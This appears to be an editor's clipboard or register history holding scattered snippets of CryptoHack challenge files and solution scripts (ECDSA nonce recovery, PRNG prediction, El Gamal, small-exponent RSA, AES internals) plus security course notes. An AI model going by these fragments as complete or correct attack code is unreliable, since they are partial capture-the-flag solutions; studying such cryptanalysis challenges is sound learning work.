	0x40710790c5cd78f0ee4ec525c0e256a8342f67800128e53dc2b907069c82b7bd8322e181374568564e3e0fd84146f5bcd713c329e656999c5aa00000000000000000000010b2a5ac495ffcf12a58d73da783e9e1293723411b14ee2fee00606ffc9e8f3f0e1e721772cfc7204279bcec2a90947952a91ff93fae2321337bbf83:0x81c5ad808774c46cc3a709f86787af3aed1a9fc8eb090e58b655b61f94a419f8fb8051c21bae5aa147d0b72954f0488fb18f5bc966bff2b5d4a951cf496da1f55965557ae746a02d2fd5c27553101488502d520dc1ca345a480ddea2f7439eed07085d2ddce0b3611430ba6641f3a8702a29974c86778fe43d096e84e2c5a3ae16e836152ab1bf3b4bd755ac2e5b59b4f247a096f9fefa637ebf538f64cd2336fc98c4544873d35b911463ae0ba9ef274b5a126abb604304536279cff6bc46aa0a7831e72a63441ebbe708b560949f9f025f68b16593850852a24a5a9343616ac6ad0dcdd5fe6e3a408aec6293e705b09d0df0800ae0dd6f33b2b1f57e1c655b
785efd6ae8249c9817a4b78d993d9bec|file:///home/neo/cryptohack/general/mathematics2/ROCA2/ROCA.log|1|5|v|
	x40710790c5cd78f0ee4ec525c0e256a8342f67800128e53dc2b907069c82b7bd8322e181374568564e3e0fd84146f5bcd713c329e656999c5aa00000000000000000000010b2a5ac495ffcf12a58d73da783e9e1293723411b14ee2fee00606ffc9e8f3f0e1e721772cfc7204279bcec2a90947952a91ff93fae2321337bbf83
eb7716fdc30bb33a0442073be6bd8b5f|file:///home/neo/cryptohack/general/mathematics2/ROCA2/ROCA.log|1|4|v|
	0x40710790c5cd78f0ee4ec525c0e256a8342f67800128e53dc2b907069c82b7bd8322e181374568564e6e5c8fcce9371ddca86073ea028b410df21d07b310de86d1aa526e24148e79772aa9c4c4b94d2593afe4c42035ed0f6ee9b3efe707842862106d69
7d2157261ca935507168f6f65833f19e|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|51|1|V|python
	print(json_recv())
570a9a55fc1dc6e3123c64ff08cae2e8|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|34|1|V|python
	rec = json_recv()
	round_num = rec['round']
	hand = rec['hand']
	msg = rec['msg'].split()
	next_shuffle = int(msg[msg.index('after')+1])
a8ac424ebe09f3645ce7b5ac05c1454e|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|39|1|V|python
	rand_num = 0
e99ead03a0e981f9b52c6d0bf7f0b4c5|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|51|1|V|python
	print(r.recvline())
04ea7022168f8f13727e08b42788e496|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|53|1|V|python
	rec = json_recv()
	round_num = rec['round']
	hand = rec['hand']
	msg = rec['msg'].split()
	next_shuffle = int(msg[msg.index('after')+1])
	print(next_shuffle)
	rand_num = 0
995063e362f1880a7f47b9256de88933|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|40|1|V|python
	# cards = [16, 36, 3]
d7127a2cce9eeb15b4d784df930bd389|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|47|1|V|python
	    # hand = str(deck[cards.pop()]).split()
0dec71fdc02b59ae9270b4d497d189e3|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|38|1|V|python
	next_shuffle = int(msg[msg.index('after')+1])
285665bcbd290354aa7237d9b57dadde|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|53|9|V|python
	        next_shuffle = 
c10965ce0a743d7bed7083b3f573de61|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|52|9|V|python
	        print(rand_num)
b8bc8b6b60c3454248c795ea2aecb255|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|54|9|V|python
	        prin
632a2406bbcbcd553eec45ac14b40a0a|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|52|43|v|python
	after
372e66c2fd992885fc68f7cf736d0d78|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|40|1|V|python
	# for i in range(next_shuffle-1, -1, -1):
0af703419e30687a80433e0ce64db745|file:///home/neo/cryptohack/misc/prngs/lohi.py|14|11|^v|python
	2**61 - 1 
a5782d95f177202da679ea0b4c962f0a|file:///home/neo/Documents/epl682/notes/mobile-security.md|8|5|V|markdown
	    + Found malware are fed into the first filter
c19b19eeda5d22f2624793eac6e6d381|file:///home/neo/Documents/epl682/notes/mobile-security.md|11|32|v|markdown
	malicious
da6dad3c7ca1b8fcbfd9653d1cc4c02d|file:///home/neo/Documents/epl682/notes/mobile-security.md|24|1|V|markdown
	- Repackaging:
a8274bf927394511eb96b22c61bd08c0|file:///home/neo/Documents/epl682/notes/anonymity.md|9|1|V|markdown
	- Last OR opens a connection with the website
b85237a618c818d8d522fe1484a80aca|file:///home/neo/Documents/epl682/notes/anonymity.md|18|1|V|markdown
	- Goal is to deanonymize the sender
a688d128cb68b57751c5a298ae68853b|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|11|1|V|python
	g = generator_192
	n = g.order()
b2cade6676f29f7de02b7192b28d5775|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|3|1|V|python
	import hashlib
	from Crypto.Util.number import bytes_to_long, long_to_bytes
	from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192
	from utils import listener
	from datetime import datetime
	from random import randrange
a08262586bd0e290a094381870a819f0|file:///home/neo/sol_prosign.py|6|1|V|python
	from utils import listener
	from datetime import datetime
	from random import randrange
9e8a43dc590869648e0fcbd28b85d527|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|1|1|V|python
	from pwn import * # pip install pwntools
077dd1b4a21619cd0f101abcd6294157|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|3|1|V|python
	import hashlib
1ed01d1909122bc1345897929f13593d|file:///home/neo/sol_prosign.sage|2|1|V|python
	# m1 = Current time is 4:12
	# m2 = Current time is 4:16
8d8fdee2496826caacd30142d2c676f6|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|22|1|V|python
	    def sha1(self, data):
	        sha1_hash = hashlib.sha1()
	        sha1_hash.update(data)
dc5df35c2c66303fa953a7ddf042a29b|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|22|1|V|python
	    def sha1(self, data):
	        sha1_hash = hashlib.sha1()
	        sha1_hash.update(data)
	        return sha1_hash.digest()
a7677f878d765745793ed6803a9cb859|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|32|1|V|python
	        hsh = self.sha1(msg.encode())
a8f168d3193d0ad4453ba5269c1346d4|file:///home/neo/sol_prosign.sage|8|1|V|python
	n = 6277101735386680763835789423176059013767194773182842284081
74a3f0994eaddb873377926530d1c31c|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_prosign.sage|15|1|V|python
	print(k)
ff233a12e53866cbd17b9e83fe2028b1|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|3|1|V|python
	import hashlib
	from Crypto.Util.number import bytes_to_long, long_to_bytes
	from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192
f7c188693db2ea547ed9e30fc200aca8|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|19|1|V|python
	        self.pubkey = Public_key(g, g * secret)
	        self.privkey = Private_key(self.pubkey, secret)
e4eeef5a371cac6ba4bf60620a771aa7|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|33|1|V|python
	        sig = self.privkey.sign(bytes_to_long(hsh), randrange(1, n))
dab888877e70803802ffb55b12096063|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|34|16|v|python
	{"msg": msg, "r": hex(sig.r), "s": hex(sig.s)}
e2f9e5e08cae27e2a49ac9ae90f417a7|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|8|1|V|python
	from random import randrange
2541d938b0a58946090d7abdde0d3890|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_prosign.py|24|7|v|python
	send
18fff6f33239b5b48f066743b6becf87|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_prosign.sage|8|1|V|python
	z1 = 543112295677960489320783479851277179819909522242
5f7a0fcde14808ef03a6c3db021c8a5a|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_prosign.sage|8|1|V|python
	z2 = 914284567155709925899926598812178262477632761164
4caca1fcce851f6733982f9862100492|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_prosign.sage|5|54|V|python
	s1 = 0xb5c1895604a9af6330efb8d8b9e7cc53ca231820b1cae389
	s2 = 0xb5c18956252ba7be92350566a7beb8fb650f648ac718c88e
3b50e5d28a12721bd91d9b583aa69f21|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_prosign.py|15|1|V|python
	secret = 2181999484643102535423734381005872406373759169693458142734
0573ab78c4fd3a634a85b612041233f8|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_prosign.sage|12|1|V|python
	target = 768665405814267518441464004296910105957328558115 # "verify" hash
200a834eb674a57847dc9c278acac63d|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|3|1|V|python
	import hashlib
	from Crypto.Util.number import bytes_to_long, long_to_bytes
	from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192
	from utils import listener
	from datetime import datetime
	from random import randrange
	
	FLAG = "crypto{?????????????????????????}"
	g = generator_192
	n = g.order()
d56790a4cbee9ca8de10da0719b47607|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|29|1|V|python
	        m, n = int(now.strftime("%m")), int(now.strftime("%S"))
38b792c9506640f8e9727f8a7c5c4b77|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|28|1|V|python
	        now = datetime.now()
	        m, n = int(now.strftime("%m")), int(now.strftime("%S"))
2c7fc14fcec689441303ded17642bee3|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|43|39|V|python
	iv = "74646250ed2bacf6787d4994a2c4dcb4"
	ciphertext = "cbc8a933739cb97b2380221edc1f4c558c0513bb4b09215e8dcc8e2a7db83b7ba3ff0f467f82206d406d4699bfc0c26978d5201862ec4d74bff7e3fc7d291b16ec67d02683df0b1d70552300ef6b3add"
0d8df0322b7336193ebf12e890535769|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|40|1|V|python
	shared_secret = 15902739134860419121003122738477963119381153588466554365343365487666344050388728818270951827894309745675272051557380143315840252127780003089572476960610246761703060985388079054168472624380872476156634220853520432561706884044978905860609215879467348352942477471316458587300673494853749189795171068350109002108244479079951907936200298058273699604267028804619128734988528189704489031532032829794847066828964104578773320469096434046551616968942809477324894079199790
2696d61d9a5333b08025031db39e9014|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|41|1|V|python
	iv = "31d9af544d454573ca6c676db5653d8f"
	ciphertext = "8790f2ccef87a5e53b5360f54883e098824deefe91029951c911d9578febea51efdca2c4db612f8124119fa105374f646274af7aa7fe88fa27b3a466e4af4e9d72581961b8e75fdff98bdcff94d02413"
f1ac56038d49f8dfb89f30e36d538879|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|37|1||python
	shared_secret = Q * n
	#######################
	shared_secret = 2368889504635074522597970528436572299373704260900359161070645673228909603871160218047885963075951718224302629357301456415181622446216672904301810533655318521319005894668461834218646043083086096452033237662880207578210325069986680805064495859904055932198801097632510258523074960467055380357398025576981776461119744191354319558693354879381724156813202457600882047938007002665054664268227777640888389702547922083529068253931268965801147785394380114219370807016748988
	iv = "3b9837a25a30966dec3e02c7878e2658"
	ciphertext =
0d9ae77f5cc9f79d34c6b9fb725a3376|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|37|1|V|python
	#  
	print(decrypt_flag(shared_secret, iv, ciphertext))
0ed80771e9fb00c598e473a23b1f9a4f|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|37|1|v|python
	# n = 6534
0afdcf4667568a9c317313279158978c|file:///home/neo/cryptohack/misc/el-gamal/source.py|1|1|V|python
	from Crypto.Random import random
	from Crypto.Util.number import getPrime, bytes_to_long
b6891f023176a1c3cb3157467b7d5e93|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.py|9|1|V|python
	print(lines)
ac8c74db7dd1896389e13b466b7bfea6|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|7|1|V|python
	    c1_line = f.readline()
	    ct = c1_line.split('=')[1]
21944e7ba3687cf882e82e5a578a61b0|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|10|1|V|python
	    print('c1:', c1)
b03bff887cb0a299aad86e0b9c5a04f0|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|5|5|V|python
	    key_line = f.readline()
0acf21c4c4a2d3d89ee833b33e3ca10c|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|3|1|V|python
	line = True
f5298528256ae5879f16a14e5b314b0e|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|3|1|V|python
	key_line = f.readline()
92780428fdcba6e0fc9f1a8df882bf42|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|3|1|v|python
	key_line
06a5e030b07f35b3254315c7be1c2870|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|7|5|V|python
	    print('public key:', public_key)
ea92807d3dca5ed79734cc5b6bfabb06|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|11|5|V|python
	    print('c2:', c2)
f92024a70bdf51a9111d9ed0e8251fa5|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|53|1|V|python
	        if kronecker(a, p) == -1:
8cded59e3d366e469b7e6c348f840346|file:///home/neo/cryptohack/misc/el-gamal/source.py|2|1|V|python
	from Crypto.Util.number import getPrime, bytes_to_long
c28a7e956df9d7f4b828107a1484da5c|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|26|1|V|python
	    if kronecker(c1, q) == kronecker(c2, q): # If g^r is a QR (=> h^r is QR) and h^r * m is QR
89ca43694462c328292e8bac4031bc73|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|20|48|v|python
	If g^r is a QR (=> h^r is QR) and h^r * m is QR
1bca5ebeaa8d7128c0af0d413f4318b4|file:///home/neo/cryptohack/misc/el-gamal/sol_elgamal.sage|20|28|v|python
	kronecker(c2, q)
315ca2a5d9894e65a2715515e5067a5f|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|3|1|V|python
	from Crypto.PublicKey import RSA
	from Crypto.Util.number import bytes_to_long, long_to_bytes
	from sympy.core.numbers import mod_inverse
	
	FLAG = b"crypto{???????????????????????????????????}"
	
66f7193e0eacf6cf8c287646bb7952b6|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|21|1|V|python
	
	key = RSA.generate(1024, e=3)
	n, e = key.n, key.e
	
	m = bytes_to_long(pad100(FLAG))
	c = pow(m, e, n)
ccaa2afb25b6a0e661d9faf9425ab7f4|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|7|1|V|python
	FLAG = b"crypto{???????????????????????????????????}"
3c34583f7b7de1d24a5c14cf41004ca3|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|9|1|V|python
	n = 95341235345618011251857577682324351171197688101180707030749869409235726634345899397258784261937590128088284421816891826202978052640992678267974129629670862991769812330793126662251062120518795878693122854189330426777286315442926939843468730196970939951374889986320771714519309125434348512571864406646232154103
	e = 3
	c = 63476139027102349822147098087901756023488558030079225358836870725611623045683759473454129221778690683914555720975250395929721681009556415292257804239149809875424000027362678341633901036035522299395660255954384685936351041718040558055860508481512479599089561391846007771856837130233678763953257086620228436828
	
	def pad100(msg):
	    return msg + b'\x00' * (100 - len(msg))
cad252554acffe2863039b1fd76ae51d|file:///home/neo/cryptohack/misc/prngs/lohi.py|5|1|V|python
	FLAG = 'crypto{?????????????????????????????}'
8c73a98a300905900337f535531dfca6|file:///home/neo/Documents/epl682/notes/usable-security.md|17|26|v|markdown
	shape
b2b6a63dc960cbb29e00581094b9d76c|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|19|1|V|python
	padded = bytes_to_long(pad100(FLAG))
a12db96e2f7cf0f9baa7d5ca42e13903|file:///home/neo/cryptohack/rsa/padding/pad_encrypt.py|26|1|V|python
	# c = pow(m, e, n)
0d2d0a42acd2f65abbf0f7b3f587d6c3|file:///home/neo/cryptohack/rsa/exponent/wires.py|1|1|V|python
	from Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long, inverse
ba255706411b789b328c33594f53d450|file:///home/neo/cryptohack/rsa/exponent/wires.py|3|1|V|python
	from gmpy2 import next_prime
44773f61e47e443433be147d48b8a539|file:///home/neo/cryptohack/general/mathematics/square_root.txt|1|1|V|text
	a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768
	p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161
aabb1d0b6c0c7984189f301474ba364f|file:///home/neo/cryptohack/general/mathematics/broken_rsa.txt|1|1|V|text
	n = 27772857409875257529415990911214211975844307184430241451899407838750503024323367895540981606586709985980003435082116995888017731426634845808624796292507989171497629109450825818587383112280639037484593490692935998202437639626747133650990603333094513531505209954273004473567193235535061942991750932725808679249964667090723480397916715320876867803719301313440005075056481203859010490836599717523664197112053206745235908610484907715210436413015546671034478367679465233737115549451849810421017181842615880836253875862101545582922437858358265964489786463923280312860843031914516061327752183283528015684588796400861331354873
	e = 16
	ct = 11303174761894431146735697569489134747234975144162172162401674567273034831391936916397234068346115459134602443963604063679379285919302225719050193590179240191429612072131629779948379821039610415099784351073443218911356328815458050694493726951231241096695626477586428880220528001269746547018741237131741255022371957489462380305100634600499204435763201371188769446054925748151987175656677342779043435047048130599123081581036362712208692748034620245590448762406543804069935873123161582756799517226666835316588896306926659321054276507714414876684738121421124177324568084533020088172040422767194971217814466953837590498718
e94f0bfab8c987a7437ba4e1697c1cc0|file:///home/neo/cryptohack/block-ciphers/aes/matrix.py|7|5|v|python
	????
0ffc0986925f042fcd535d85dd12c9af|file:///home/neo/cryptohack/block-ciphers/aes/matrix.py|7|36|v|python
	matr for matr in matrix
779bf0753d6bf714b2954002be45fab0|file:///home/neo/cryptohack/block-ciphers/aes/add_round_key.py|17|4|v|python
	 ???
f91b1e24b109c1726f097b4895731828|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|8|19|V|python
	    new_state = []
	    for i in range(4): 
	        line = state[i]
	        new_line = []
ab0c98286fc27a93914ee1f63ac50648|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|2|1|V|python
	    s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]
	    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
	    s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]
31435d69b5c2dfa54eca547b55fd601d|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|8|42|v|python
	s[1][1], s[2][1], s[3][1], s[0][1]
8c4076105ee1f61e1e304a5702383867|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|8|39|v|python
	s[0][1], s[1][1], s[2][1], s[3][1] 
05193698b0d07485a6c04e501e01ce60|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|9|42|v|python
	s[2][2], s[3][2], s[0][2], s[1][2]
74d316c7297f3b9303c209d6fc344c32|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|9|41|v|python
	s[0][2], s[1][2], s[2][2], s[3][2] 
d89b33961fcdc61e4d045327b49adaa1|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|10|5|v|python
	s[0][3], s[1][3], s[2][3], s[3][3] 
4faf31de68cf6fabcb628490a3922909|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|10|7|v|python
	s[3][3], 
76c8cd5e877f5ff9c9395bcb0ea78354|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|10|7|v|python
	s[0][3], s[1][3], s[2][3] s[0][3], 
2b6bdc5bdf1d93196648eff1e61d1786|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|10|5|v|python
	s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]
e5724f3f3466faa92041bd1b71d4e10e|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|10|42|v|python
	s[3][3], s[0][3], s[1][3], s[2][3]
ff396b985a206630612dd86287458fc2|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|5|1|V|python
	    return s
ab6e0afce6231069bbf1696311c7800e|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|55|1|v|python
	state = 
07a075ec3117d60e279ea26df2724cfd|file:///home/neo/cryptohack/block-ciphers/aes/matrix.py|1|1|V|python
	def bytes2matrix(text):
	    """ Converts a 16-byte array into a 4x4 matrix.  """
	    return [list(text[i:i+4]) for i in range(0, len(text), 4)]
	
	def matrix2bytes(matrix):
	    """ Converts a 4x4 matrix into a 16-byte array.  """
	    return ''.join(chr(c) for c in matrix[0] + matrix[1] + matrix[2] + matrix[3]) 
3fbc40e879b6de3ae372b9b0692dfad5|file:///home/neo/cryptohack/block-ciphers/aes/add_round_key.py|16|1|V|python
	def add_round_key(s, k):
	    new_state = []
	    for i,line in enumerate(s):
	        new_line = [a ^ b for a,b in zip(line,k[i])]
	        new_state.append(new_line)
	    return(new_state)
35db2f34a155079cd7308a97ff0926ea|file:///home/neo/cryptohack/block-ciphers/aes/diffusion.py|1|1|V|python
	def shift_rows(s):
	    s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]
	    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
	    s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]
	
	
	def inv_shift_rows(s):
	    s[1][1], s[2][1], s[3][1], s[0][1] = s[0][1], s[1][1], s[2][1], s[3][1] 
	    s[2][2], s[3][2], s[0][2], s[1][2] = s[0][2], s[1][2], s[2][2], s[3][2] 
	    s[3][3], s[0][3], s[1][3], s[2][3] = s[0][3], s[1][3], s[2][3], s[3][3] 
	
	
	# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c
	xtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)
	
	
	def mix_single_column(a):
	    # see Sec 4.1.2 in The Design of Rijndael
	    t = a[0] ^ a[1] ^ a[2] ^ a[3]
	    u = a[0]
	    a[0] ^= t ^ xtime(a[0] ^ a[1])
	    a[1] ^= t ^ xtime(a[1] ^ a[2])
	    a[2] ^= t ^ xtime(a[2] ^ a[3])
	    a[3] ^= t ^ xtime(a[3] ^ u)
	
	
	def mix_columns(s):
	    for i in range(4):
	        mix_single_column(s[i])
	
	
	def inv_mix_columns(s):
	    # see Sec 4.1.3 in The Design of Rijndael
	    for i in range(4):
	        u = xtime(xtime(s[i][0] ^ s[i][2]))
	        v = xtime(xtime(s[i][1] ^ s[i][3]))
	        s[i][0] ^= u
	        s[i][1] ^= v
	        s[i][2] ^= u
	        s[i][3] ^= v
	
	    mix_columns(s)
	
	
d26afb0ce2211f47733f351eac09e029|file:///home/neo/cryptohack/block-ciphers/aes/sbox.py|1|1|V|python
	s_box = (
	    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
	    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
	    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
	    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
	    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
	    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
	    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
	    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
	    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
	    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
	    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
	    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
	    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
	    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
	    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
	    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
	)
	
	inv_s_box = (
	    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
	    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
	    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
	    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
	    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
	    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
	    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
	    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
	    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
	    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
	    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
	    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
	    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
	    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
	    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
	    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
